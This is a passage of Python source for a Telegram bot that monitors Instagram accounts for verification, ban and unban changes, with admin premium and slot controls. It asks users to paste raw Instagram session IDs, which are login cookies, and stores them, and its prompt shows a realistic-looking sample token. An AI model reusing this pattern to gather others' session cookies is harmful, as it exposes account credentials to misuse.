    sessions = ig_pool.get_user_owned_sessions_only(user_id)
    if not sessions:
        return None
    workloads = {s: 0 for s in sessions}
    db.cursor.execute("SELECT assigned_worker FROM monitors WHERE status='active' AND user_id=?", (user_id,))
    for row in db.cursor.fetchall():
        worker = row['assigned_worker']
        if worker in workloads:
            workloads[worker] += 1
    min_load = min(workloads.values())
    candidates = [s for s, load in workloads.items() if load == min_load]
    return random.choice(candidates) if candidates else None

def rebalance_monitor_workers():
    workers_admin = ig_pool.get_available_sessions_for_user(ADMIN_USER_ID, True)
    if not workers_admin:
        return
    
    db.cursor.execute(
        "SELECT id, assigned_worker FROM monitors WHERE status='active' AND assigned_worker IN (SELECT instagram_username FROM ig_sessions WHERE owner_user_id=? AND is_active=1 AND status='valid' AND session_scope='admin')",
        (ADMIN_USER_ID,)
    )
    monitors = db.cursor.fetchall()
    
    valid_workers = set(workers_admin)
    for monitor in monitors:
        if monitor['assigned_worker'] not in valid_workers:
            db.cursor.execute("UPDATE monitors SET assigned_worker=NULL WHERE id=?", (monitor['id'],))
    db.conn.commit()
    
    db.cursor.execute("SELECT id FROM monitors WHERE status='active' AND assigned_worker IS NULL")
    unassigned = db.cursor.fetchall()
    for row in unassigned:
        db.cursor.execute("SELECT user_id FROM monitors WHERE id=?", (row['id'],))
        monitor_row = db.cursor.fetchone()
        if not monitor_row:
            continue
        user_id = monitor_row['user_id']
        if is_premium(user_id):
            worker = get_least_loaded_worker_for_user(user_id, True)
        else:
            worker = get_least_loaded_user_session_for_user(user_id)
        if worker:
            db.cursor.execute("UPDATE monitors SET assigned_worker=? WHERE id=?", (worker, row['id']))
            db.conn.commit()
    db.conn.commit()

def format_time(elapsed: int) -> str:
    days, rem = divmod(elapsed, 86400)
    hours, rem = divmod(rem, 3600)
    minutes, seconds = divmod(rem, 60)
    if days > 0:
        return f"{days}d {hours}h {minutes}m {seconds}s"
    if hours > 0:
        return f"{hours}h {minutes}m {seconds}s"
    if minutes > 0:
        return f"{minutes}m {seconds}s"
    return f"{seconds}s"

def safe_html_escape(text: Any) -> str:
    if text is None:
        return "N/A"
    return html.escape(str(text))

def format_welcome(user_id: int, first_name: str) -> str:
    user = get_user(user_id)
    if not user:
        return "Please use /start again."
    
    premium = is_premium(user_id)
    max_acc = get_max_accounts(user_id)
    active_mon = get_active_monitors(user_id)
    
    username = safe_html_escape(user['username'] or "None")
    first_name_escaped = safe_html_escape(first_name)
    
    status_emoji = "👑" if premium else "🆓"
    status_text = "Premium User" if premium else "Free User"
    
    welcome = (
        f"🌟 Welcome, <b>{first_name_escaped}</b>!\n"
        f"{SEPARATOR}\n"
        f"🆔 Your User ID: <code>{user_id}</code>\n"
        f"✳️ Username: @{username}\n"
        f"🔰 Status: {status_emoji} {status_text}\n"
        f"📊 Active Monitors: {active_mon} / {max_acc}\n"
        f"⏱️ Check Interval: {get_user_monitor_interval(user_id)}s\n"
        f"{SEPARATOR}\n"
        f"🤖 This bot monitors Instagram accounts and can notify you when their verification, ban or unban status changes.\n"
        f"🔎 Choose what you want to monitor from the buttons below.\n\n"
        f"— @rejerks | WLZBI"
    )
    return welcome

def get_main_keyboard(user_id: int) -> ReplyKeyboardMarkup:
    keyboard = [
        ["🔍 Verification", "🚫 Ban Monitor"],
        ["♻️ Unban Monitor", "📊 Monitor Status"],
        ["🗑 Remove Monitor", "ℹ️ Help"],
        ["🔐 My Sessions", "⏱️ Set Interval"]
    ]
    if user_id == ADMIN_USER_ID:
        keyboard.append(["⚙️ Admin Panel"])
    return ReplyKeyboardMarkup(keyboard, resize_keyboard=True)

def get_admin_keyboard() -> ReplyKeyboardMarkup:
    keyboard = [
        ["👑 Premium Management", "📊 Slot Management"],
        ["➕ Add Admin Session", "🔄 Update Admin Session"],
        ["🗑 Delete Admin Session", "👥 User Sessions"],
        ["👥 User Statistics", "📢 Broadcast"],
        ["🏠 Main Menu"]
    ]
    return ReplyKeyboardMarkup(keyboard, resize_keyboard=True)

def get_session_management_keyboard() -> ReplyKeyboardMarkup:
    keyboard = [
        ["➕ Add Session", "🔄 Update Session"],
        ["🗑 Remove Session", "📋 My Sessions"],
        ["🏠 Main Menu"]
    ]
    return ReplyKeyboardMarkup(keyboard, resize_keyboard=True)

async def bio_check_loop(user_id: int, context: ContextTypes.DEFAULT_TYPE):
    while not shutdown_event.is_set():
        try:
            if is_premium(user_id):
                logger.info(f"User {user_id} is premium, skipping bio check")
                break
            
            chat = await asyncio.wait_for(
                context.bot.get_chat(user_id),
                timeout=CONNECT_TIMEOUT
            )
            bio = chat.bio or ""
            if REQUIRED_TAG not in bio:
                logger.info(f"User {user_id} removed {REQUIRED_TAG} from bio")
                stop_user_monitors(user_id)
                cleanup_user_tasks(user_id)
                db.cursor.execute("UPDATE monitors SET status='stopped' WHERE user_id=? AND status='active'", (user_id,))
                db.conn.commit()
                await context.bot.send_message(
                    user_id,
                    f"⛔ <b>Monitoring Paused</b>\n\nYour bio no longer contains <code>{REQUIRED_TAG}</code>.\nPlease add it back and use /start to resume.",
                    parse_mode="HTML"
                )
                break
            await asyncio.sleep(60)
        except (TimedOut, asyncio.TimeoutError):
            logger.warning(f"Bio check timeout for user {user_id}")
            await asyncio.sleep(60)
        except Exception as e:
            logger.error(f"Bio check error for {user_id}: {e}")
            await asyncio.sleep(60)

async def error_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    logger.error(f"Update {update} caused error: {context.error}")
    if isinstance(context.error, TimedOut):
        await asyncio.sleep(2)
    elif isinstance(context.error, NetworkError):
        await asyncio.sleep(5)
    elif isinstance(context.error, RetryAfter):
        await asyncio.sleep(context.error.retry_after)

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    user_id = user.id
    first_name = user.first_name or "User"
    
    try:
        chat = await asyncio.wait_for(
            context.bot.get_chat(user_id),
            timeout=CONNECT_TIMEOUT
        )
        bio = chat.bio or ""
    except Exception as e:
        logger.error(f"Failed to get chat for {user_id}: {e}")
        bio = ""
    
    create_or_update_user(user_id, user.username or "", first_name, bio)
    
    db.cursor.execute("SELECT first_start FROM users WHERE user_id=?", (user_id,))
    row = db.cursor.fetchone()
    is_first_start = row and row['first_start'] == 1
    
    if is_first_start:
        db.cursor.execute("UPDATE users SET first_start=0 WHERE user_id=?", (user_id,))
        db.conn.commit()
    
    cleanup_user_tasks(user_id)
    if user_id not in active_tasks:
        active_tasks[user_id] = set()
    
    if not is_premium(user_id):
        active_tasks[user_id].add(asyncio.create_task(bio_check_loop(user_id, context)))
    else:
        logger.info(f"User {user_id} is premium, bio check not started")
    
    if not is_premium(user_id) and REQUIRED_TAG not in bio:
        await update.message.reply_text(
            f"⚠️ Your bio does not contain <code>{REQUIRED_TAG}</code>.\nPlease add it and wait for 1minute then restart with /start.",
            parse_mode="HTML"
        )
        return
    
    welcome_text = format_welcome(user_id, first_name)
    keyboard = get_main_keyboard(user_id)
    
    try:
        photos = await context.bot.get_user_profile_photos(user_id, limit=1)
        if photos.total_count > 0:
            await update.message.reply_photo(
                photos.photos[0][-1].file_id,
                caption=welcome_text,
                reply_markup=keyboard,
                parse_mode="HTML"
            )
        else:
            await update.message.reply_text(
                welcome_text,
                reply_markup=keyboard,
                parse_mode="HTML"
            )
    except Exception as e:
        logger.error(f"Failed to send start message: {e}")
        await update.message.reply_text(
            welcome_text,
            reply_markup=keyboard,
            parse_mode="HTML"
        )

async def cancel_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if user_id in user_states:
        del user_states[user_id]
        await update.message.reply_text("✅ Operation cancelled. You are back to the main menu.", parse_mode="HTML")
    else:
        await update.message.reply_text("ℹ️ No active operation to cancel.", parse_mode="HTML")
    user = get_user(user_id)
    if user:
        first_name = user['first_name'] or "User"
        welcome_text = format_welcome(user_id, first_name)
        keyboard = get_main_keyboard(user_id)
        await update.message.reply_text(welcome_text, reply_markup=keyboard, parse_mode="HTML")
    else:
        await update.message.reply_text("Please use /start to begin.")

async def handle_text(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    text = update.message.text.strip()
    
    if text == "🏠 Main Menu":
        user = get_user(user_id)
        if user:
            first_name = user['first_name'] or "User"
            welcome_text = format_welcome(user_id, first_name)
            keyboard = get_main_keyboard(user_id)
            await update.message.reply_text(welcome_text, reply_markup=keyboard, parse_mode="HTML")
        else:
            await update.message.reply_text("Please use /start to begin.")
        return
    
    if text == "ℹ️ Help":
        help_text = (
            f"📖 <b>Help & Information</b>\n{SEPARATOR}\n\n"
            f"🔍 <b>Verification</b> — Monitor if an account gets verified.\n"
            f"🚫 <b>Ban Monitor</b> — Monitor if an account gets banned.\n"
            f"♻️ <b>Unban Monitor</b> — Monitor if a banned account gets unbanned.\n"
            f"📊 <b>Monitor Status</b> — View your active and pending monitors.\n"
            f"🗑 <b>Remove Monitor</b> — Stop and remove an active monitor.\n"
            f"🔐 <b>My Sessions</b> — Manage your Instagram sessions.\n"
            f"⏱️ <b>Set Interval</b> — Change monitor check frequency.\n\n"
            f"💡 Free users can monitor 1 account at a time.\n"
            f"👑 Premium users get more slots and don't need @parithings.\n\n"
            f"— @rejerks | WLZBI"
        )
        keyboard = get_main_keyboard(user_id)
        await update.message.reply_text(help_text, reply_markup=keyboard, parse_mode="HTML")
        return
    
    if text == "⏱️ Set Interval":
        user = get_user(user_id)
        if not user:
            await update.message.reply_text("❌ Please use /start first.")
            return
        
        keyboard = [
            ["15 seconds", "30 seconds"],
            ["60 seconds", "120 seconds"],
            ["Custom", "🏠 Main Menu"]
        ]
        user_states[user_id] = {"action": "set_interval"}
        await update.message.reply_text(
            f"⏱️ <b>Select Monitoring Interval</b>\n\nCurrent interval: {get_user_monitor_interval(user_id)} seconds\nSelect a preset or choose Custom.",
            reply_markup=ReplyKeyboardMarkup(keyboard, resize_keyboard=True),
            parse_mode="HTML"
        )
        return
    
    if text == "🔐 My Sessions":
        user = get_user(user_id)
        if not user:
            await update.message.reply_text("❌ Please use /start first.")
            return
        
        keyboard = get_session_management_keyboard()
        await update.message.reply_text(
            "🔐 <b>Session Management</b>\n\nManage your Instagram sessions here.\n"
            "You need at least one valid session to start monitoring.\n\n"
            "📌 Sessions are used to check Instagram accounts.\n"
            "🔒 Your session IDs are stored securely.",
            reply_markup=keyboard,
            parse_mode="HTML"
        )
        return
    
    if text == "➕ Add Session":
        user = get_user(user_id)
        if not user:
            await update.message.reply_text("❌ Please use /start first.")
            return
        
        user_states[user_id] = {"action": "add_session"}
        await update.message.reply_text(
            "📤 Send the Instagram username and session ID in format:\n<code>username session_id</code>\n\n"
            "Example: <code>myinstagram 22881208834%3AULiiMVInYXJlWK%3A7%3AAYia0BGn4A7BiuQZE99DIxYs4QJpNNwmzMmzoofnJg</code>\n\n"
            "⚠️ The session will be validated before saving.\n\nSend /cancel to abort.",
            parse_mode="HTML"
        )
        return
    
    if text == "🔄 Update Session":
        user = get_user(user_id)
        if not user:
            await update.message.reply_text("❌ Please use /start first.")
            return
        
        sessions = ig_pool.get_user_sessions(user_id, 'user')
        if not sessions:
            await update.message.reply_text("❌ You don't have any sessions to update. Add one first.")
            return
        
        keyboard = [[s['instagram_username']] for s in sessions]
        keyboard.append(["🏠 Main Menu"])
        user_states[user_id] = {"action": "user_session_select_update"}
        await update.message.reply_text(
            "🔄 <b>Select Instagram session to update:</b>",
            reply_markup=ReplyKeyboardMarkup(keyboard, resize_keyboard=True),
            parse_mode="HTML"
        )
        return
    
    if text == "🗑 Remove Session":
        user = get_user(user_id)
        if not user:
            await update.message.reply_text("❌ Please use /start first.")
            return
        
        sessions = ig_pool.get_user_sessions(user_id, 'user')
        if not sessions:
            await update.message.reply_text("❌ You don't have any sessions to remove.")
            return
        
        keyboard = [[s['instagram_username']] for s in sessions]
        keyboard.append(["🏠 Main Menu"])
        user_states[user_id] = {"action": "user_session_select_delete"}
        await update.message.reply_text(
            "🗑 <b>Select a session to remove:</b>\n\n⚠️ This will stop any monitors using this session.",
            reply_markup=ReplyKeyboardMarkup(keyboard, resize_keyboard=True),
            parse_mode="HTML"
        )
        return
    
    if text == "📋 My Sessions":
        user = get_user(user_id)
        if not user:
            await update.message.reply_text("❌ Please use /start first.")
            return
        
        sessions = ig_pool.get_user_sessions(user_id, 'user')
        if not sessions:
            await update.message.reply_text(
                "📋 You don't have any sessions saved.\n\nUse 'Add Session' to save one.",
                reply_markup=get_session_management_keyboard()
            )
            return
        
        msg = "📋 <b>Your Sessions</b>\n\n"
        for s in sessions:
            status_emoji = "✅" if s['status'] == 'valid' else "❌"
            safe_username = safe_html_escape(s['instagram_username'])
            msg += f"{status_emoji} @{safe_username} — {s['status'].upper()}\n"
        
        msg += f"\nTotal: {len(sessions)} session(s)"
        await update.message.reply_text(msg, reply_markup=get_session_management_keyboard(), parse_mode="HTML")
        return
    
    if text == "⚙️ Admin Panel":
        if user_id != ADMIN_USER_ID:
            await update.message.reply_text("⛔ Access denied.")
            return
        admin_text = (
            f"⚙️ <b>Admin Panel</b>\n{SEPARATOR}\n"
            f"Select an action below.\n\n— @rejerks | WLZBI"
        )
        keyboard = get_admin_keyboard()
        await update.message.reply_text(admin_text, reply_markup=keyboard, parse_mode="HTML")
        return
    
    if text == "📊 Slot Management":
        if user_id != ADMIN_USER_ID:
            await update.message.reply_text("⛔ Access denied.")
            return
        user_states[user_id] = {"action": "slot_menu"}
        keyboard = [
            ["➕ Grant Slots", "➖ Remove Slots"],
            ["👁️ View Slots", "🏠 Main Menu"]
        ]
        await update.message.reply_text(
            "📊 <b>Monitor Slot Management</b>\n\n"
            "Grant or remove monitor slots without changing premium status.\n\n"
            "Free users have 1 default slot.",
            reply_markup=ReplyKeyboardMarkup(keyboard, resize_keyboard=True),
            parse_mode="HTML"
        )
        return
    
    if text == "👁️ View Slots":
        if user_id != ADMIN_USER_ID:
            await update.message.reply_text("⛔ Access denied.")
            return
        user_states[user_id] = {"action": "slot_view"}
        await update.message.reply_text(
            "📝 Send user ID to view their slot information:\n\nExample: <code>123456789</code>\n\nSend /cancel to abort.",
            parse_mode="HTML"
        )
        return
    
    if text == "➕ Grant Slots":
        if user_id != ADMIN_USER_ID:
            await update.message.reply_text("⛔ Access denied.")
            return
        user_states[user_id] = {"action": "slot_grant"}
        await update.message.reply_text(
            "📝 Send user ID and slot count in format:\n<code>userid slot_count</code>\n\n"
            "Example: <code>123456789 5</code>\n\n"
            "This grants the user additional monitor slots without premium status.\n\nSend /cancel to abort.",
            parse_mode="HTML"
        )
        return
    
    if text == "➖ Remove Slots":
        if user_id != ADMIN_USER_ID:
            await update.message.reply_text("⛔ Access denied.")
            return
        user_states[user_id] = {"action": "slot_remove"}
        await update.message.reply_text(
            "📝 Send user ID to remove all granted slots:\n\nExample: <code>123456789</code>\n\n"
            "This resets the user to their default slot count.\n\nSend /cancel to abort.",
            parse_mode="HTML"
        )
        return
    
    if text == "👑 Premium Management":
        if user_id != ADMIN_USER_ID:
            await update.message.reply_text("⛔ Access denied.")
            return
        user_states[user_id] = {"action": "premium_menu"}
        keyboard = [
            ["➕ Add Premium", "➖ Remove Premium"],
            ["🏠 Main Menu"]
        ]
        await update.message.reply_text(
            "👑 <b>Manage Premium Users</b>\nSelect an option:",
            reply_markup=ReplyKeyboardMarkup(keyboard, resize_keyboard=True),
            parse_mode="HTML"
        )
        return
    
    if text == "➕ Add Premium":
        if user_id != ADMIN_USER_ID:
            await update.message.reply_text("⛔ Access denied.")
            return
        user_states[user_id] = {"action": "premium_add"}
        await update.message.reply_text(
            "📝 Send user ID, days, accounts in format:\n<code>userid days accounts</code>\n\n"
            "Example: <code>123456789 30 5</code>\n\n"
            "This grants premium access with specified slots.\n\nSend /cancel to abort.",
            parse_mode="HTML"
        )
        return
    
    if text == "➖ Remove Premium":
        if user_id != ADMIN_USER_ID:
            await update.message.reply_text("⛔ Access denied.")
            return
        user_states[user_id] = {"action": "premium_remove"}
        await update.message.reply_text(
            "📝 Send user ID to remove premium:\n\nExample: <code>123456789</code>\n\n"
            "This removes premium access but preserves granted slots.\n\nSend /cancel to abort.",
            parse_mode="HTML"
        )
        return
    
    if text == "➕ Add Admin Session":
        if user_id != ADMIN_USER_ID:
            await update.message.reply_text("⛔ Access denied.")
            return
        user_states[user_id] = {"action": "add_admin_session"}
        await update.message.reply_text(
            "📤 Send the Instagram username and session ID in format:\n<code>username session_id</code>\n\n"
            "This will be an admin session available to premium users.\n\nSend /cancel to abort.",
            parse_mode="HTML"
        )
        return
    
    if text == "🔄 Update Admin Session":
        if user_id != ADMIN_USER_ID:
            await update.message.reply_text("⛔ Access denied.")
            return
        sessions = ig_pool.get_user_sessions(ADMIN_USER_ID, 'admin')
        if not sessions:
            await update.message.reply_text("❌ No admin sessions available.")
            return
        keyboard = [[s['instagram_username']] for s in sessions]
        keyboard.append(["🏠 Main Menu"])
        user_states[user_id] = {"action": "admin_session_select_update"}
        await update.message.reply_text(
            "🔄 <b>Select admin session to update:</b>",
            reply_markup=ReplyKeyboardMarkup(keyboard, resize_keyboard=True),
            parse_mode="HTML"
        )
        return
    
    if text == "🗑 Delete Admin Session":
        if user_id != ADMIN_USER_ID:
            await update.message.reply_text("⛔ Access denied.")
            return
        sessions = ig_pool.get_user_sessions(ADMIN_USER_ID, 'admin')
        if not sessions:
            await update.message.reply_text("❌ No admin sessions to delete.")
            return
        keyboard = [[s['instagram_username']] for s in sessions]
        keyboard.append(["🏠 Main Menu"])
        user_states[user_id] = {"action": "admin_session_select_delete"}
        await update.message.reply_text(
            "🗑 <b>Select an admin session to delete:</b>\n\n⚠️ This will affect premium users using this session.",
            reply_markup=ReplyKeyboardMarkup(keyboard, resize_keyboard=True),
            parse_mode="HTML"
        )
        return
    
    if text == "👥 User Sessions":
        if user_id != ADMIN_USER_ID:
            await update.message.reply_text("⛔ Access denied.")
            return
        db.cursor.execute(
            "SELECT owner_user_id, COUNT(*) as count FROM ig_sessions WHERE session_scope='user' AND is_active=1 GROUP BY owner_user_id"
        )
        sessions = db.cursor.fetchall()
        if not sessions:
            await update.message.reply_text("No user sessions found.")
            return
        
        msg = "👥 <b>User Sessions Summary</b>\n\n"
        for s in sessions:
            user = get_user(s['owner_user_id'])
            username = user['username'] if user else str(s['owner_user_id'])
            msg += f"👤 @{username} ({s['owner_user_id']}): {s['count']} session(s)\n"
        
        await update.message.reply_text(msg, parse_mode="HTML", reply_markup=get_admin_keyboard())
        return
    
    if text == "👥 User Statistics":
        if user_id != ADMIN_USER_ID:
            await update.message.reply_text("⛔ Access denied.")
            return
        db.cursor.execute("SELECT COUNT(*) FROM users")
        total_users = db.cursor.fetchone()[0]
        db.cursor.execute("SELECT COUNT(*) FROM ig_sessions WHERE is_active=1")
        total_sessions = db.cursor.fetchone()[0]
        db.cursor.execute("SELECT COUNT(*) FROM monitors WHERE status='active'")
        active_monitors = db.cursor.fetchone()[0]
        
        stats_text = (
            f"👥 <b>User Statistics</b>\n{SEPARATOR}\n\n"
            f"👥 Total Users: {total_users}\n"
            f"🔐 Active Sessions: {total_sessions}\n"
            f"🟢 Active Monitors: {active_monitors}\n\n— @rejerks | WLZBI"
        )
        keyboard = get_admin_keyboard()
        await update.message.reply_text(stats_text, reply_markup=keyboard, parse_mode="HTML")
        return
    
    if text == "📢 Broadcast":
        if user_id != ADMIN_USER_ID:
            await update.message.reply_text("⛔ Access denied.")
            return
        user_states[user_id] = {"action": "broadcast"}
        await update.message.reply_text(
            "📢 Send the message you want to broadcast to all users.\n\nYou can use HTML formatting.\n\nSend /cancel to abort.",
            parse_mode="HTML"
        )
        return
    
    if text in ["🔍 Verification", "🚫 Ban Monitor", "♻️ Unban Monitor"]:
        user = get_user(user_id)
        if not user:
            await update.message.reply_text("❌ Please use /start first.")
            return
        
        if not is_premium(user_id):
            try:
                chat = await context.bot.get_chat(user_id)
                bio = chat.bio or ""
                if REQUIRED_TAG not in bio:
                    await update.message.reply_text(
                        f"⚠️ Your bio does not contain <code>{REQUIRED_TAG}</code>.\n"
                        f"Please add it to your Telegram bio and try again.",
                        parse_mode="HTML"
                    )
                    return
            except Exception as e:
                logger.error(f"Bio check error: {e}")
        
        sessions = ig_pool.get_user_owned_sessions_only(user_id)
        if not sessions:
            await update.message.reply_text(
                "❌ You don't have any valid user sessions.\n\n"
                "Please add a session using 'My Sessions' -> 'Add Session' first."
            )
            return
        
        if get_active_monitors(user_id) >= get_max_accounts(user_id):
            await update.message.reply_text(
                f"⛔ You've reached your monitor limit ({get_max_accounts(user_id)}).\n"
                "Stop existing monitors first or request more slots."
            )
            return
        
        action_map = {
            "🔍 Verification": "verification",
            "🚫 Ban Monitor": "ban",
            "♻️ Unban Monitor": "unban"
        }
        monitor_type = action_map[text]
        
        # Check for existing active monitor of same type
        if check_existing_active_monitor(user_id, sessions[0], monitor_type) if len(sessions) == 1 else False:
            await update.message.reply_text(
                f"⚠️ You already have an active {monitor_type} monitor for this session.\n"
                "Remove the existing monitor first or use a different session."
            )
            return
        
        user_states[user_id] = {"action": monitor_type}
        
        if len(sessions) > 1:
            user_states[user_id]["sessions"] = sessions
            keyboard = [[s] for s in sessions]
            keyboard.append(["Skip (auto-select)"])
            user_states[user_id]["waiting_session_select"] = True
            await update.message.reply_text(
                f"📤 <b>Select Instagram session to use:</b>\n\n"
                f"Choose which session should monitor the target.",
                reply_markup=ReplyKeyboardMarkup(keyboard, resize_keyboard=True),
                parse_mode="HTML"
            )
            return
        
        user_states[user_id]["selected_session"] = sessions[0]
        await update.message.reply_text(
            f"📝 Send the Instagram username you want to monitor for <b>{monitor_type}</b>.\n\n"
            f"Using session: @{sessions[0]}\n\nSend /cancel to abort.",
            parse_mode="HTML"
        )
        return
    
    if text == "📊 Monitor Status":
        user = get_user(user_id)
        if not user:
            await update.message.reply_text("❌ Please use /start first.", reply_markup=get_main_keyboard(user_id))
            return
        
        premium = is_premium(user_id)
        max_acc = get_max_accounts(user_id)
        active_mon = get_active_monitors(user_id)
        pending = db.cursor.execute(
            "SELECT COUNT(*) FROM monitors WHERE user_id=? AND status='pending'", (user_id,)
        ).fetchone()[0]
        
        db.cursor.execute(
            "SELECT id, ig_username, monitor_type, status FROM monitors WHERE user_id=? AND status IN ('active', 'pending')",
            (user_id,)
        )
        monitors = db.cursor.fetchall()
        
        status_text = f"📊 <b>Your Monitors</b>\n\n{SEPARATOR}\n\n"
        status_text += f"🟢 Active: {active_mon}\n"
        status_text += f"⏳ Pending: {pending}\n"
        status_text += f"📌 Max Slots: {max_acc}\n"
        status_text += f"💎 Plan: {'👑 Premium' if premium else '🆓 Free'}\n"
        status_text += f"⏱️ Interval: {get_user_monitor_interval(user_id)}s\n\n"
        
        if monitors:
            status_text += "<b>Details:</b>\n"
            for m in monitors:
                emoji = "🟢" if m['status'] == 'active' else "⏳"
                safe_ig = safe_html_escape(m['ig_username'])
                status_text += f"{emoji} @{safe_ig} — {m['monitor_type'].capitalize()}\n"
        else:
            status_text += "No active or pending monitors."
        
        status_text += f"\n\n{SEPARATOR}\n\n— @rejerks | WLZBI"
        
        keyboard = get_main_keyboard(user_id)
        await update.message.reply_text(status_text, reply_markup=keyboard, parse_mode="HTML")
        return
    
    if text == "🗑 Remove Monitor":
        db.cursor.execute(
            "SELECT id, ig_username, monitor_type, status FROM monitors WHERE user_id=? AND status IN ('active', 'pending')",
            (user_id,)
        )
        monitors = db.cursor.fetchall()
        if not monitors:
            await update.message.reply_text("📭 You have no monitors to remove.\n\n— @rejerks | WLZBI")
            return
        
        keyboard = []
        monitor_map = {}
        for m in monitors:
            safe_ig = safe_html_escape(m['ig_username'])
            status_emoji = "🟢" if m['status'] == 'active' else "⏳"
            label = f"{status_emoji} @{safe_ig} ({m['monitor_type'].capitalize()})"
            keyboard.append([label])
            monitor_map[label] = m['id']
        keyboard.append(["🔙 Back"])
        
        user_states[user_id] = {"action": "remove_select", "monitor_map": monitor_map}
        await update.message.reply_text(
            "🗑 <b>Select a monitor to remove:</b>",
            reply_markup=ReplyKeyboardMarkup(keyboard, resize_keyboard=True),
            parse_mode="HTML"
        )
        return
    
    if text == "🔙 Back":
        if user_id in user_states:
            del user_states[user_id]
        user = get_user(user_id)
        if user:
            first_name = user['first_name'] or "User"
            welcome_text = format_welcome(user_id, first_name)
            keyboard = get_main_keyboard(user_id)
            await update.message.reply_text(welcome_text, reply_markup=keyboard, parse_mode="HTML")
        else:
            await update.message.reply_text("Please use /start to begin.")
        return
    
    if user_id in user_states and user_states[user_id].get("action") == "remove_select":
        state = user_states[user_id]
        monitor_map = state.get("monitor_map", {})
        if text in monitor_map:
            monitor_id = monitor_map[text]
            if remove_monitor_completely(monitor_id, user_id):
                await update.message.reply_text("✅ Monitor removed successfully.\n\n— @rejerks | WLZBI")
            else:
                await update.message.reply_text("❌ Failed to remove monitor. Please try again.")
            if user_id in user_states:
                del user_states[user_id]
            keyboard = get_main_keyboard(user_id)
            await update.message.reply_text("Select an option:", reply_markup=keyboard)
            return
        else:
            await update.message.reply_text("❌ Invalid selection.")
            return
    
    if user_id in user_states and user_states[user_id].get("waiting_session_select"):
        state = user_states[user_id]
        sessions = state.get("sessions", [])
        if text in sessions:
            state["selected_session"] = text
            del state["waiting_session_select"]
            monitor_type = state.get("action")
            await update.message.reply_text(
                f"✅ Selected session: @{text}\n\n"
                f"📝 Send the Instagram username you want to monitor for <b>{monitor_type}</b>.\n\n"
                f"Send /cancel to abort.",
                parse_mode="HTML"
            )
            return
        elif text == "Skip (auto-select)":
            state["selected_session"] = sessions[0]
            del state["waiting_session_select"]
            monitor_type = state.get("action")
            await update.message.reply_text(
                f"✅ Auto-selected session: @{sessions[0]}\n\n"
                f"📝 Send the Instagram username you want to monitor for <b>{monitor_type}</b>.\n\n"
                f"Send /cancel to abort.",
                parse_mode="HTML"
            )
            return
        else:
            await update.message.reply_text("❌ Invalid selection. Please choose from the list.")
            return
    
    if user_id not in user_states:
        await update.message.reply_text("❌ Please use /start and select an option first.")
        return
    
    state = user_states[user_id]
    action = state.get("action")
    
    if action == "user_session_select_update":
        sessions = ig_pool.get_user_sessions(user_id, 'user')
        session_names = [s['instagram_username'] for s in sessions]
        if text in session_names:
            user_states[user_id] = {"action": "session_update", "ig_user": text}
            await update.message.reply_text(
                f"📤 Send the new session ID for @{text}\n\nSend /cancel to abort."
            )
        else:
            await update.message.reply_text("❌ Invalid session selected.")
        return
    
    if action == "user_session_select_delete":
        sessions = ig_pool.get_user_sessions(user_id, 'user')
        session_names = [s['instagram_username'] for s in sessions]
        if text in session_names:
            success = await ig_pool.delete_session(text, user_id)
            if success:
                await update.message.reply_text(f"✅ Session @{text} removed successfully.")
            else:
                await update.message.reply_text(f"❌ Failed to remove session @{text}. Please try again or contact support.")
            del user_states[user_id]
            keyboard = get_session_management_keyboard()
            await update.message.reply_text("Session Management:", reply_markup=keyboard)
        else:
            await update.message.reply_text("❌ Invalid session selected.")
        return
    
    if action == "set_interval":
        interval_map = {
            "15 seconds": 15,
            "30 seconds": 30,
            "60 seconds": 60,
            "120 seconds": 120
        }
        if text in interval_map:
            new_interval = interval_map[text]
            db.cursor.execute("UPDATE users SET monitor_interval=? WHERE user_id=?", (new_interval, user_id))
            db.conn.commit()
            await update.message.reply_text(f"✅ Monitoring interval set to {new_interval} seconds.")
            del user_states[user_id]
            keyboard = get_main_keyboard(user_id)
            await update.message.reply_text("Select an option:", reply_markup=keyboard)
            return
        elif text == "Custom":
            user_states[user_id] = {"action": "set_interval_custom"}
            await update.message.reply_text(
                "📝 Enter custom interval in seconds (min 5, max 300):\n\nSend /cancel to abort."
            )
            return
        elif text == "🏠 Main Menu":
            del user_states[user_id]
            user = get_user(user_id)
            first_name = user['first_name'] if user else "User"
            welcome_text = format_welcome(user_id, first_name)
            keyboard = get_main_keyboard(user_id)
            await update.message.reply_text(welcome_text, reply_markup=keyboard, parse_mode="HTML")
            return
        else:
            await update.message.reply_text("❌ Invalid selection. Please choose from the list.")
            return
    
    if action == "set_interval_custom":
        try:
            new_interval = int(text)
            if 5 <= new_interval <= 300:
                db.cursor.execute("UPDATE users SET monitor_interval=? WHERE user_id=?", (new_interval, user_id))
                db.conn.commit()
                await update.message.reply_text(f"✅ Monitoring interval set to {new_interval} seconds.")
                del user_states[user_id]
                keyboard = get_main_keyboard(user_id)
                await update.message.reply_text("Select an option:", reply_markup=keyboard)
            else:
                await update.message.reply_text("❌ Interval must be between 5 and 300 seconds.")
        except ValueError:
            await update.message.reply_text("❌ Please enter a valid number.")
        return
    
    if action == "slot_view":
        if user_id != ADMIN_USER_ID:
            await update.message.reply_text("⛔ Access denied.")
            del user_states[user_id]
            return
        try:
            target_id = int(text)
            user = get_user(target_id)
            if not user:
                await update.message.reply_text("❌ User not found.")
                return
            max_acc = get_max_accounts(target_id)
            granted = user['granted_slots'] or 0
            premium = is_premium(target_id)
            
            msg = (
                f"👤 <b>Slot Information for User {target_id}</b>\n{SEPARATOR}\n"
                f"📌 Current Slots: {max_acc}\n"
                f"➕ Granted Slots: {granted}\n"
                f"💎 Premium: {'Yes' if premium else 'No'}\n"
                f"🟢 Active Monitors: {get_active_monitors(target_id)}\n"
                f"{SEPARATOR}"
            )
            await update.message.reply_text(msg, parse_mode="HTML")
        except ValueError:
            await update.message.reply_text("❌ Invalid user ID.")
        del user_states[user_id]
        keyboard = get_admin_keyboard()
        await update.message.reply_text("Admin Panel:", reply_markup=keyboard)
        return
    
    if action == "slot_grant":
        if user_id != ADMIN_USER_ID:
            await update.message.reply_text("⛔ Access denied.")
            del user_states[user_id]
            return
        parts = text.split()
        if len(parts) != 2:
            await update.message.reply_text("❌ Invalid format. Use: <code>userid slot_count</code>", parse_mode="HTML")
            return
        try:
            target_id = int(parts[0])
            slot_count = int(parts[1])
